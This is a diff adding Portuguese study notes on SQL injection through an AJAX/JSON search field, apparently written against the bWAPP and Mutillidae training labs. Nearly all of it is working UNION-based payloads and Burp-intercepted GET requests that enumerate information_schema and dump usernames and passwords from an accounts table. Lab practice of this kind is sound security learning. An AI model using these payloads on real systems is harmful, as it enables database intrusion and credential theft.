@@ -1,0 +1,19 @@
+SQL Injection (AJAX/JSON/JQUERY)
+
+Está vulnerabilidade é parecida com o SQL Injection Post Select
+
+Podemos fazer a injeção pelo campo de busca da aplicação.
+Ex:
+'order by 7#
+'union select 1,2,3,4,5,6,7#
+'union select 1,table_name,table_schema,4,5,6,7 from information_schema.tables#
+'union select 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema="mutillidae" AND table_name="accounts"#
+'union select 1,username,password,4,5,6,7 from mutillidae.accounts#
+
+
+Vamos interceptar com o BurpSuite
+
+GET /bwapp/sqli_10-2.php?title=%27+union+select+1,database(),3,4,5,6,7%23 HTTP/1.1
+GET /bwapp/sqli_10-2.php?title=%27+union+select+1,table_name,table_schema,4,5,6,7%20from%20information_schema.tables%23 HTTP/1.1
+GET /bwapp/sqli_10-2.php?title=%27+union+select+1,column_name,3,4,5,6,7%20from%20information_schema.columns%20where%20table_schema="mutillidae"%20and%20table_name="accounts"%23 HTTP/1.1
+GET /bwapp/sqli_10-2.php?title=%27+union+select+1,username,password,4,5,6,7%20from%20mutillidae.accounts%23 HTTP/1.1
